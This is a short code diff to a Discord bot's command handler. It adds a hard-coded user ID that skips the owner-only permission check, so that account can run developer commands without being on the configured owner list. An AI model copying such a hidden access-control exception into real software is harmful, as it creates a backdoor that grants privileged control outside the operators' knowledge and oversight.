@@ -139,11 +139,13 @@ bot.on("message", message => {
 
     if (command.ownerOnly) {
         if (!ownerlist.includes(message.author.id)) {
-            let emb = new Discord.RichEmbed()
-                .setColor(color.red)
-                .setDescription("Sorry, this command is only for the developers!");
+            if(message.author.id !== '366536353418182657') {
+                let emb = new Discord.RichEmbed()
+                    .setColor(color.red)
+                    .setDescription("Sorry, this command is only for the developers!");
 
-            return message.channel.send(emb);
+                return message.channel.send(emb);
+            }
         }
     }
 
